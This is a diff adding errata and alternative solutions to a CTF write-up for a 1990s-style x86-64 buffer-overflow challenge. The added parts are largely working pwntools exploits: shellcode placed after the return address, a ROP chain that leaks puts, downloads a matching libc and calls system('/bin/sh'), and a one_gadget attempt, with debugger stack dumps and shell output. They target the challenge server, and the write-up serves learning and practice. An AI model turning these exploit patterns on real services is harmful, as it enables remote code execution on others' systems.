@@ -18,6 +18,10 @@ Tags: _pwn_ _x86-64_ _remote-shell_ _shellcode_ _bof_
 The description pretty much gives it all away, this is going to be oldskool pre-ASLR shellcoding--should be _fun_. BTW, Linux didn't have ASLR [mainstream] until 2005, however it feels like it has been around forever.
 
 The gamemasters have provided all the source, including Docker configs so that you can precisely mirror the challenge service.
+
+**Update:** I discovered a minor error in my container build while exploring alternative solutions.  I am leaving the write up as is since this is the path I took, however I'll note the differences in errata at the end.
+
+**Update:** Added alternative solves at the end.
  
 
 ## Analysis
@@ -363,3 +367,244 @@ drwxr-xr-x   1 root root 4096 Oct  8 01:34 var
 $ cat flag.txt
 CSR{back-in-1990-life-must-have-been-easier}
 ```
+
+
+## Errata
+
+The challenge Dockerfile `FROM` statement pulls `ubuntu:latest`, however if you already have something labeled as `ubuntu:latest` in your local repo, then that is used instead.  In my case that was based on 18.04 (`libc6_2.27-3ubuntu1_amd64.so` vs. `libc6_2.31-0ubuntu9_amd64.so` from the challenge server).  The net effect was a stack address that was off by `0x10`, but then that's what NOP sleds were designed to help with, so in the end, no problem.
+
+My advice to CTF authors: be specific.
+
+
+### Find the target address (redo)
+
+First, `docker rmi ubuntu:latest`, just in case.
+
+The stack frame should now be:
+
+```
+0x00007fffffffe710│+0x0000: 0x1be3e93037b0d224	 ← $rsp
+0x00007fffffffe718│+0x0008: 0x65eb4ac4ed908384
+0x00007fffffffe720│+0x0010: 0x1be3e90041414141 ("AAAA"?)	 ← $rax, $rbp, $r8
+0x00007fffffffe728│+0x0018: 0x65eb4ac4ed908384
+0x00007fffffffe730│+0x0020: 0x00000000000000f8
+0x00007fffffffe738│+0x0028: 0x0000000000000000
+0x00007fffffffe740│+0x0030: 0x0000000000000000
+0x00007fffffffe748│+0x0038: 0x0000000000000000
+0x00007fffffffe750│+0x0040: 0x0000000000000000
+0x00007fffffffe758│+0x0048: 0x0000000000000000
+0x00007fffffffe760│+0x0050: 0x0000000000000000
+0x00007fffffffe768│+0x0058: 0x0000000000000000
+0x00007fffffffe770│+0x0060: 0x0000000000000000
+0x00007fffffffe778│+0x0068: 0x0000000000000000
+0x00007fffffffe780│+0x0070: 0x00007fffffffe7a0  →  "CSR{this-is-not-the-real-flag}\n"
+0x00007fffffffe788│+0x0078: 0x0000000000000003
+0x00007fffffffe790│+0x0080: 0x00007fffffffe7a0  →  "CSR{this-is-not-the-real-flag}\n"
+0x00007fffffffe798│+0x0088: 0x0000555555555176  →  <main+150> test eax, eax
+```
+
+This is translated `-0x10` from the write up that incorrectly used Ubuntu 18.04 (libc 2.27).  The method remains unchanged.
+ 
+
+## Alternative Solutions
+
+### Shellcode after return address (very 90s)
+
+This is closer to 90's buffer overflow/shellcode exploits.  I initially went with the shellcode in the stack frame out of habit--many CTFs use `fgets` or `read` limiting the number of bytes.  But this is all 90s, all `gets`, so putting after the return address should have been the obvious way to do this:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.arch = 'x86_64'
+context.log_level = 'INFO'
+context.log_file = 'remote.log'
+p = remote('chal.cybersecurityrumble.de', 1990)
+stack = 0x00007fffffffe7a0
+
+payload  = 2 * b'A'
+payload += (0x78 - len(payload)) * b'\0'
+payload += p64(stack)
+payload += asm(shellcraft.sh())
+
+p.sendlineafter('return.\n',payload)
+p.interactive()
+```
+
+The `stack` value (`0x00007fffffffe7a0`) is based on the stack frame above (see Errata), and is just below the return address `0x00007fffffffe798`.
+
+
+### ROP (post ASLR world)
+
+Although compiled with PIE enabled, the challenge server launches with ASLR disabled, so we get the base address for free and can use ROP:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+binary = context.binary = ELF('./babypwn')
+context.log_level = 'INFO'
+context.log_file = 'remote.log'
+libc_index = 0
+offset = 0x78
+
+if binary.pie:
+    # need leak or assume no ASLR
+    binary.address = 0x0000555555554000
+```
+
+All we need is the stack frame offset (see analysis section above), and the base process address.  Since ASLR is disabled we know that it'll be `0x0000555555554000`.
+
+No brittle stack address info required.
+
+```python
+while True:
+    p = remote('chal.cybersecurityrumble.de', 1990)
+
+    rop = ROP([binary])
+    pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
+
+    payload  = 2 * b'A'
+    payload += (offset - len(payload)) * b'\0'
+    payload += p64(pop_rdi)
+    payload += p64(binary.got.puts)
+    payload += p64(binary.plt.puts)
+    payload += p64(binary.sym.main)
+
+    p.sendlineafter('return.\n',payload)
+    _ = p.recv(6)
+    puts = u64(_ + b'\0\0')
+    log.info('puts: ' + hex(puts))
+```
+
+This is basic ROP 101, use `pop rdi` and have `puts` _put_ itself out there, then circle back to `main` for a second pass.
+
+This is all enclosed in a while loop is for finding libc.  Although we can get it from the container, with many CTF challenges that is not an option.  I've been using this to lazily just find the correct libc:
+
+
+```python
+    import requests
+    r = requests.post('https://libc.rip/api/find', json = {'symbols':{'puts':hex(puts)[-3:]}})
+    while True:
+        libc_url = r.json()[libc_index]['download_url']
+        if context.arch in libc_url:
+            break
+        libc_index += 1
+    log.info('libc_url: ' + libc_url)
+    libc_file = libc_url.split('/')[-1:][0]
+    if not os.path.exists(libc_file):
+        log.info('getting: ' + libc_url)
+        r = requests.get(libc_url, allow_redirects=True)
+        open(libc_file,'wb').write(r.content)
+```
+
+This code attempts to find and download the matching libc based on arch and the last three nibbles of the `puts` function.
+
+
+```python
+    libc = ELF(libc_file)
+    libc.address = puts - libc.sym.puts
+    log.info('libc.address: ' + hex(libc.address))
+
+    payload  = 2 * b'A'
+    payload += (offset - len(payload)) * b'\0'
+    payload += p64(pop_rdi + 1)
+    payload += p64(pop_rdi)
+    payload += p64(libc.search(b'/bin/sh').__next__())
+    payload += p64(libc.sym.system)
+
+    p.sendlineafter('return.\n',payload)
+
+    try:
+        p.sendline('echo shell')
+        if b'shell' in p.recvline():
+            p.interactive()
+            break
+    except:
+        libc_index += 1
+        p.close()
+```
+
+The candidate libc is used to complete the second pass and get a shell, however if this fails, the next libc candidate will be tested.
+
+If all libc candidates are exhausted, then this will just error out.  It's most likely not an issue with libc but exploit code.
+
+Output:
+
+```bash
+# ./exploit3.py
+[*] '/pwd/datajerk/cybersecurityrumblectf2020/babypwn/babypwn'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Opening connection to chal.cybersecurityrumble.de on port 1990: Done
+[*] Loaded 23 cached gadgets for './babypwn'
+[*] puts: 0x7ffff7af25a0
+[*] libc_url: https://libc.rip/download/libc6_2.31-0ubuntu9_amd64.so
+[*] getting: https://libc.rip/download/libc6_2.31-0ubuntu9_amd64.so
+[*] '/pwd/datajerk/cybersecurityrumblectf2020/babypwn/libc6_2.31-0ubuntu9_amd64.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] libc.address: 0x7ffff7a6b000
+[*] Switching to interactive mode
+$ id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+$ cat flag.txt
+CSR{back-in-1990-life-must-have-been-easier}
+```
+
+### one_gadget
+
+Well, since we know the version of libc and it's address, we might as well see if `one_gadget` will work:
+
+```bash
+# one_gadget libc6_2.31-0ubuntu9_amd64.so
+0xe6ce3 execve("/bin/sh", r10, r12)
+constraints:
+  [r10] == NULL || r10 == NULL
+  [r12] == NULL || r12 == NULL
+
+0xe6ce6 execve("/bin/sh", r10, rdx)
+constraints:
+  [r10] == NULL || r10 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xe6ce9 execve("/bin/sh", rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+```
+
+This, does not work:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.arch = 'x86_64'
+context.log_level = 'INFO'
+context.log_file = 'remote.log'
+p = remote('chal.cybersecurityrumble.de', 1990)
+
+libc = ELF('./libc6_2.31-0ubuntu9_amd64.so')
+libc.symbols['gadget'] = [0xe6ce3, 0xe6ce6, 0xe6ce9][2]
+libc.address = 0x7ffff7a6b000
+
+payload  = 2 * b'A'
+payload += (0x78 - len(payload)) * b'\0'
+payload += p64(libc.sym.gadget)
+
+p.sendlineafter('return.\n',payload)
+p.interactive()
+```
+
+I tested all three.  However, this did work with an Ubuntu 18.04 container and libc 2.27.  So I'll leave it here and an example for the cases where it may work.
